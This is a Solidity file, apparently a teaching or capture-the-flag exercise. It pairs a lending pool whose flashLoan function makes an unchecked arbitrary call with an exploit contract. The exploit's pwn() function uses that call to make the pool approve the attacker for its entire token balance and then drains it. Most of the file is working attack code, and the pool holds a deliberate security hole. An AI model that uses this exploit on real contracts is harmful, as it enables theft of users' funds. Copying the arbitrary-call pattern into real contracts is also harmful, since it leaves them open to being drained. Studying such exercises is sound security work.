// SPDX-License-Identifier: MIT
pragma solidity ^0.8.2;
import "sce/sol/IERC20.sol";

contract LendingPool {
    IERC20 public token;

    constructor(address _token) {
        token = IERC20(_token);
    }

    function flashLoan(
        uint256 _amount,
        address _target,
        bytes calldata _data
    ) external {
        uint256 balBefore = token.balanceOf(address(this));
        require(balBefore >= _amount, "borrow amount > balance");

        token.transfer(msg.sender, _amount);
        (bool executed, ) = _target.call(_data);
        require(executed, "loan failed");

        uint256 balAfter = token.balanceOf(address(this));
        require(balAfter >= balBefore, "balance after < before");
    }
}


interface ILendingPool {
    function token() external view returns (address);
    function flashLoan(uint256 amount, address target, bytes calldata data)
        external;
}

contract LendingPoolExploit {
    ILendingPool public pool;
    IERC20 public token;

    constructor(address _pool) {
        pool = ILendingPool(_pool);
        token = IERC20(pool.token());
    }

    function pwn() external {
        uint256 bal = token.balanceOf(address(pool));
        pool.flashLoan(
            0,
            address(token),
            abi.encodeWithSelector(token.approve.selector, address(this), bal)
        );
        token.transferFrom(address(pool), address(this), bal);
    }
}
